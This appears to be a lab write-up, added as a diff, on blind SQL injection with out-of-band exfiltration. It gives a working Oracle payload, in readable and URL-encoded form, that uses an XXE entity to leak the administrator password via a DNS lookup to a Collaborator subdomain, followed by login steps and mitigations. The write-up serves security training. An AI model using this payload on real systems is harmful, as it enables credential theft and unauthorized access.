@@ -1,0 +1,61 @@
+Lab: Blind SQL injection with out-of-band data exfiltration
+
+Difficulty: Practitioner
+Vulnerability: Blind SQL Injection → Out‑of‑band data exfiltration (via XML/XXE + SQL)
+
+Summary
+
+Short version: the app trusts a tracking cookie and sticks it straight into a SQL query that's executed async. The response you see doesn’t change, but the DB query can trigger external DNS/HTTP lookups — so we can make the database “call home” with the administrator password in the hostname. Use Burp Collaborator to catch that callback, extract the password, and log in as admin. Pretty neat and a bit sneaky, but straightforward.
+
+Steps taken
+
+Logged in to the lab and opened the shop front page to create/trigger the tracking cookie behavior.
+
+Turned on Burp Suite and enabled interception. Right away I intercepted the request that included the TrackingId cookie.
+
+Sent the intercepted request to Burp Repeater (or edited it in the proxy) and replaced the TrackingId value with a payload that forces the DB to perform an XXE-style XML parse which loads a remote SYSTEM entity — the remote URL contains the result of a subquery that selects the administrator password.
+
+Important: the lab blocks arbitrary external domains, so you must use Burp Collaborator (right‑click → Insert Collaborator payload) to get a unique subdomain to use in the payload.
+
+Example payload (readable form — replace YOUR-COLLAB-SUBDOMAIN with the Collaborator value Burp inserts):
+
+x' UNION SELECT EXTRACTVALUE(
+  xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLAB-SUBDOMAIN/"> %remote; ]>'),
+  '/l'
+) FROM dual--
+
+
+URL-encoded version (so you can paste directly into cookie value if needed):
+
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+root+%5B+%3C!ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2F%27%7C%7C(SELECT+password+FROM+users+WHERE+username%3D%27administrator%27)%7C%7C%27.YOUR-COLLAB-SUBDOMAIN%2F%22+%3E+%25remote%3B+%5D%3E'),'/%6C')+FROM+dual--
+
+
+After inserting the Collaborator subdomain into the payload, forwarded the modified request so the application server executed the SQL/XML logic asynchronously.
+
+Switched to Burp → Collaborator tab and clicked Poll now (or just wait a few seconds). You should see DNS (and possibly HTTP) interactions from the lab hitting your Collaborator subdomain.
+
+The administrator password will appear as part of the hostname in the interaction (because the SELECT result was concatenated into the remote SYSTEM URL).
+
+For DNS interactions the full domain is shown in the Description; for HTTP interactions it will appear in the Host header in the request.
+
+Copied the password from the Collaborator interaction, opened the app’s login page (My account), and logged in as administrator with that password.
+
+Lab solved.
+
+Root cause
+
+The app constructs a SQL statement using a user‑controlled cookie value and executes it without proper parameterization or sanitization. The DB engine (Oracle in this example) allows XML functions and external entity resolution that can be abused to force out‑of‑band lookups. Because the server performs the query asynchronously (and doesn’t echo results), OOB channels (DNS/HTTP) are the only reliable way to exfiltrate data.
+
+Fixes & Mitigation
+
+Never concatenate raw user input into SQL. Use parameterized queries / prepared statements.
+
+Disable or restrict XML external entity resolution (XXE) and similar features in database/XML parsers where not needed.
+
+Apply least privilege to the DB user so it cannot access or call out to the network where unnecessary.
+
+Whitelist allowable cookie values or validate them strictly server-side (e.g., accept only known tracking tokens).
+
+Log and monitor unusual outbound DNS/HTTP requests from backend servers (OOB exfil patterns).
+
+For asynchronous operations, ensure sensitive operations are validated server-side and don't depend on client-controlled data.
